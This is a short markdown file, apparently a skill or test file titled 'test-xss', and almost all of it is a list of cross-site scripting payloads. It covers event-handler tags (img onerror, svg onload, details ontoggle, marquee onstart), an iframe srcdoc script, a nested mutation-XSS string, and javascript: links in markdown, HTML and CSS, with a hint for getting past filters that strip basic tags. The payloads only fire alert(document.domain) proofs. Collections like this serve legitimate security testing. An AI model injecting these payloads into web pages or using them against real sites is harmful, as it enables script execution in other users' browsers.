---
name: test-xss 
description: "test."
---
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>">
[click me](javascript:alert(document.domain))
<a href="javascript:alert(document.domain)">click</a>
If basic tags are stripped, try:
<div style="background:url('javascript:alert(1)')">test</div>
<img src="x" onerror="alert(document.domain)" />
<body onload=alert(1)>
<marquee onstart=alert(document.domain)>